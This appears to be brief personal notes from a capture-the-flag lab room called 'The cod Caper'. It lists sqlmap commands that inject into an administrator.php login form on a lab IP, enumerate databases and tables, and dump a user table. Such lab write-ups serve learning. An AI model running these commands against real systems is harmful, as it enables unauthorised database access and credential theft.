## The cod Caper

A guided room taking you through infiltrating and exploiting a Linux system.

### Host Enumeration 

10.10.7.32



### SQLMAP
```bash
sqlmap -u http://10.10.85.197/administrator.php --data 'username=&password='

sqlmap -u http://10.10.85.197/administrator.php --data 'username=&password=' -a #`-a` Grabs just about everything from the db

sqlmap -u http://10.10.85.197/administrator.php --data 'username=&password=' --dbs # grab databases

sqlmap -u http://10.10.85.197/administrator.php --data 'username=&password=' -D users --tables

#dump user tables

sqlmap -u http://10.10.85.197/administrator.php --data 'username=&password=' -D users -T user --dump

dump users tables

```
